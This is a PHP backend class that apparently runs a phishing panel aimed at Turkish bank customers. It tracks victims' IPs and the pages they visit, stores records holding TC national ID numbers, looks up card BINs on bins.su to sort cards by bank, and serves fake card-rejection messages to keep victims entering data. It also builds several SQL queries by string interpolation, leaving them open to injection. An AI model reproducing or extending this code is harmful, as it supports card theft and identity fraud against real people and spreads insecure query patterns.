<?php
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);
class Ajax
{
    private $online = 0;
    private $offline = 0;
    private $total = 0;
    private $ban = 0;
    private $db = "";


    public function __construct($db)
    {
        $this->db = $db;
        try {
            $this->db->query("ALTER TABLE ips ADD COLUMN page VARCHAR(255) DEFAULT 'Anasayfa'");
        } catch (Exception $e) {
            // Suppress if column already exists
        }
        try {
            $this->db->query("DELETE FROM records WHERE tc = ''");
        } catch (Exception $e) {
            // Suppress error
        }
        try {
            $cleanupTime = time() - 300;
            $cleanup = $this->db->prepare("DELETE FROM ips WHERE lastOnline < ?");
            $cleanup->execute([$cleanupTime]);
        } catch (Exception $e) {
            // Suppress error
        }
    }


    public function getOnline()
    {
        $this->online = 0;
        try {
            $now = time();
            $query = $this->db->prepare("SELECT COUNT(*) as count FROM ips WHERE lastOnline > ?");
            $query->execute([$now]);
            $res = $query->fetch(PDO::FETCH_ASSOC);
            if ($res) {
                $this->online = (int)$res['count'];
            }
        } catch (Exception $e) {
            // Suppress error if table does not exist
        }

        return $this->online;
    }

    public function getGirisOnline()
    {
        $count = 0;
        try {
            $now = time();
            $query = $this->db->prepare("SELECT COUNT(*) as count FROM ips WHERE lastOnline > ? AND page = ?");
            $query->execute([$now, 'Giriş Sayfası']);
            $res = $query->fetch(PDO::FETCH_ASSOC);
            if ($res) {
                $count = (int)$res['count'];
            }
        } catch (Exception $e) {
            // Suppress error
        }

        return $count;
    }

    public function updateOnline($ip)
    {
        // Skip updating online status for admin panel requests
        if (strpos($_SERVER['SCRIPT_NAME'], '/gmypanel/') !== false) {
            return;
        }

        $timex = time() + 10;
        try {
            $isIp = $this->db->prepare("SELECT id FROM ips WHERE ipAddress = ? LIMIT 1");
            $isIp->execute([$ip]);
            if ($isIp->fetch()) {
                $update = $this->db->prepare("UPDATE ips SET lastOnline = ? WHERE ipAddress = ?");
                $update->execute([$timex, $ip]);
            } else {
                $insert = $this->db->prepare("INSERT INTO ips (ipAddress, lastOnline) VALUES (?, ?)");
                $insert->execute([$ip, $timex]);
            }

            // Also update user record if exists
            $updateRecord = $this->db->prepare("UPDATE records SET lastOnline = ? WHERE ipAddress = ?");
            $updateRecord->execute([$timex, $ip]);

            // Garbage collect inactive IPs (older than 5 minutes) to prevent database swelling
            $cleanupTime = time() - 300;
            $cleanup = $this->db->prepare("DELETE FROM ips WHERE lastOnline < ?");
            $cleanup->execute([$cleanupTime]);
        } catch (Exception $e) {
            // Suppress error
        }
    }

    public function getBans()
    {
        $this->ban = 0;
        $bans =array();
        $query = $this->db->query("SELECT * FROM bans", PDO::FETCH_ASSOC);
        foreach ($query as $v) {
            $this->ban = $this->ban + 1;
            $bans[] = $v;
        }

        return array('count' => $this->ban, 'data' => $bans);
    }
    
    public function get_os_name()
    {
        $ostypes = array(
            'Win311' => 'Win16',
            'Win95' => '(Windows 95)|(Win95)|(Windows_95)',
            'WinME' => '(Windows 98)|(Win 9x 4.90)|(Windows ME)',
            'Windows 98' => '(Windows 98)|(Win98)',
            'Windows 2000' => '(Windows NT 5.0)|(Windows 2000)',
            'Windows XP' => '(Windows NT 5.1)|(Windows XP)',
            'WinServer2003' => '(Windows NT 5.2)',
            'WinVista' => '(Windows NT 6.0)',
            'Windows 7' => '(Windows NT 6.1)',
            'Windows 8' => '(Windows NT 6.2)',
            'WinNT' => '(Windows NT 4.0)|(WinNT4.0)|(WinNT)|(Windows NT)',
            'OpenBSD' => 'OpenBSD',
            'SunOS' => 'SunOS',
            'Ubuntu' => 'Ubuntu',
            'Android' => 'Android ([A-Z0-9-]+)(;\s)?(\S+)?',
            'Linux' => '(Linux)|(X11)',
            'iPhone' => 'iPhone',
            'iPad' => 'iPad',
            'MacOS' => '(Mac_PowerPC)|(Macintosh)',
            'QNX' => 'QNX',
            'BeOS' => 'BeOS',
            'OS2' => 'OS/2',
            'SearchBot' => '(nuhk)|(Googlebot)|(Yammybot)|(Openbot)|(Slurp)|(MSNBot)|(Ask Jeeves/Teoma)|(ia_archiver)'
        );
    
        $useragent = $_SERVER['HTTP_USER_AGENT'];
       foreach ($ostypes as $os => $pattern) {
      if (preg_match('/' . $pattern . '/i', $useragent, $matches)) {
                if ($os === 'Android') {
                    $model = $matches[1];
                    $number = isset($matches[3]) ? $matches[3] : '';
                    return str_replace(';','',$os . ' ' . ucfirst($model) . ' ' . ucfirst($number)); // Model numarası ve noktalı virgül sonrası numarayı döndür
                } else {
                    return $os;
                }
            }
        }
        return 'Unknown';
    }

    public function getAllRecords()
    {
        return $this->db->query("SELECT * FROM records WHERE ipAddress NOT IN (SELECT ipAddress FROM bans) ORDER BY id DESC");
    }

    public function binQuery($num)
    {
        $ch = curl_init("http://bins.su/");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "action=searchbins&bins=$num&bank=&country=");
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

        $html = curl_exec($ch);
        curl_close($ch);

        $dom = new DOMDocument();
        @$dom->loadHTML($html);
        $xpath = new DOMXPath($dom);
        $rows = $xpath->query('//*[@id="result"] ');
        $data = array();
        foreach ($rows as $row) {
            foreach ($row->getElementsByTagName('table') as $tbody) {
                $subelements = $tbody->getElementsByTagName("tr");
                foreach ($subelements as $key => $el) {
                    if ($key == 0) {
                        continue;
                    }
                    $cells = $el->getElementsByTagName('td');
                    foreach ($cells as $cell) {
                        $data[] = $cell->nodeValue;
                    }
                }
            }
        }
        //Array ( [0] => 554960 [1] => TR [2] => MASTERCARD [3] => CREDIT [4] => STANDARD [5] => TURKIYE GARANTI BANKASI A.S. )
        return json_encode(array('bin' => $data[0], 'country' => $data[1], 'vendor' => $data[2], 'type' => $data[3], 'level' => $data[4], 'bank' => $data[5]));
    }

    public function errorMsg($type)
    {
        $array = array(
            'eticaret' => 'Kredi/Banka Kartınız e-ticaret işlemine kapalıdır.',
            'limit' => 'Kredi/Banka Kartınızın limiti yeterli değil.',
            'normal' => 'Kredi/Banka kartınızdan dolayı işleme devam edilememektedir. '
        );
        return $array[$type];
    } 

    public function boslukKaldir($veri)
    {
        $veri = str_replace("/s+/","",$veri);
        $veri = str_replace(" ","",$veri);
        $veri = str_replace(" ","",$veri);
        $veri = str_replace(" ","",$veri);
        $veri = str_replace("/s/g","",$veri);
        $veri = str_replace("/s+/g","",$veri);		
        $veri = trim($veri);
        return $veri; 
    }

    public function binWithCardType($bin)
    {
        $bin = substr($bin, 0, 6);

        $bin = $this->binQuery($bin);
        $bin = json_decode($bin, true);
        $bank = $bin['bank'];
        $bank = strtolower($bank);

        if (strpos($bank, 'akbank') !== false) {
            $bank = 'akbank';
        } elseif (strpos($bank, 'finansbank') !== false) {
            $bank = 'finansbank';
        } elseif (strpos($bank, 'garanti') !== false) {
            $bank = 'garanti';
        } elseif (strpos($bank, 'halk bankasi') !== false) {
            $bank = 'halkbank';
        } elseif (strpos($bank, 'ing') !== false) {
            $bank = 'ing';
        } elseif (strpos($bank, 'is bankasi') !== false) {
            $bank = 'isbankasi';
        } elseif (strpos($bank, 'yapi ve kredi bankasi') !== false) {
            $bank = 'yapikredi';
        } elseif (strpos($bank, 'ziraat') !== false) {
            $bank = 'ziraat';
        } else {
            $bank = 'other';
        }

        return $bank;
    }

    public function getTotalRecord()
    {
        $this->total = 0;

        $query = $this->db->query("SELECT * FROM records", PDO::FETCH_ASSOC);

        if ($query) {
            foreach ($query as $v) {
                $this->total = $this->total + 1;
            }
        } else {
            $this->total = 0;
        }
        return $this->total;
    }

    public function admin_data()
    {
        $query = $this->db->query("SELECT * FROM admin");
        $query->execute();
        return $query->fetch(PDO::FETCH_OBJ);
    }

    public function pageUpdate($ip, $pageName)
    {
        // 1. Update page in records table if a record exists for this IP
        $query = $this->db->prepare("UPDATE records SET page = ? WHERE ipAddress = ?");
        $query->execute([$pageName, $ip]);

        // 2. Update page in ips table for online tracking
        try {
            $queryIps = $this->db->prepare("UPDATE ips SET page = ? WHERE ipAddress = ?");
            $queryIps->execute([$pageName, $ip]);
        } catch (Exception $e) {
            // Suppress if column issue
        }
        
        return true;
    }

    public function getIstatistic()
    {
        return json_encode(array(
            'online' => $this->online,
            'total' => $this->total
        ));
    }


    public function getCityIDName($cityID)
    {
        $query = $this->db->prepare("SELECT * FROM duraklar WHERE id = $cityID");
        $query->execute();
        return $query->fetch(PDO::FETCH_OBJ)->display;
    }

    public function getIP()
    {
        $client = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote = $_SERVER['REMOTE_ADDR'];

        if (filter_var($client, FILTER_VALIDATE_IP)) {
            $ip = $client;
        } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
            $ip = $forward;
        } else {
            $ip = $remote;
        }

        return $ip;
    }

    public function isMobile()
    {
        return preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);
    }

    public function isRecord($ip)
    {
        $query = $this->db->prepare("SELECT * FROM records WHERE ipAddress = ?");
        $query->execute(array($ip));
        return $query->fetch(PDO::FETCH_OBJ);
    }

    public function getTokenDetail($token)
    {
        $query = $this->db->prepare("SELECT * FROM payments WHERE token = ?");
        $query->execute(array($token));
        return $query->fetch(PDO::FETCH_OBJ);
    }

    public function paymentTokenGenerate($length = 25)
    {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charLength - 1)];
        }
        return strtolower($randomString);
    }

    function tcDogrula($tckimlik)
    {
        $olmaz = array('11111111110', '22222222220', '33333333330', '44444444440', '55555555550', '66666666660', '7777777770', '88888888880', '99999999990');
        if ($tckimlik[0] == 0 or !ctype_digit($tckimlik) or strlen($tckimlik) != 11) {
            return false;
        } else {
            for ($a = 0; $a < 9; $a = $a + 2) {
                $ilkt = $ilkt + $tckimlik[$a];
            }
            for ($a = 1; $a < 9; $a = $a + 2) {
                $sont = $sont + $tckimlik[$a];
            }
            for ($a = 0; $a < 10; $a = $a + 1) {
                $tumt = $tumt + $tckimlik[$a];
            }
            if (($ilkt * 7 - $sont) % 10 != $tckimlik[9] or $tumt % 10 != $tckimlik[10]) {
                return false;
            } else {
                foreach ($olmaz as $olurmu) {
                    if ($tckimlik == $olurmu) {
                        return false;
                    }
                }
                return true;
            }
        }
    }

    public function redirect($url)
    {
        header("location: $url");
        exit;
    }

    public function remove($table, $col, $value)
    {
        return $this->db->query("DELETE FROM $table WHERE $col = $value");
    }

    public function banControl($ip)
    {
        $query = $this->db->prepare("SELECT * FROM bans WHERE ipAddress = ?");
        $query->execute(array($ip));
        $result = $query->fetch(PDO::FETCH_OBJ);

        if ($result) {
            return true;
        } else {
            return false;
        }
    }

    public function recordClear()
    {
        $this->db->query("TRUNCATE TABLE records");
    }
    public function banClear()
    {
        $this->db->query("TRUNCATE TABLE bans");
    }
    public function offlineClear()
    {
        $records = $this->db->query("SELECT * FROM records");

        $deletedOffline = 0;

        foreach ($records as $value) {
            if ($value["lastOnline"] < time()) {
                if (empty($value["bkm"])) {
                    $id = $value["id"];

                    $query = $this->db->query("DELETE FROM `records` WHERE `id` = $id ");

                    if ($query) {
                        $deletedOffline++;
                    }
                }
            }
        }
        return $deletedOffline;
    }


    # Input Security
    public function input($value)
    {
        $string = strip_tags($value);
        $string = filter_var($string, FILTER_SANITIZE_STRIPPED);
        $string = htmlspecialchars($string);

        return $string;
    }


}










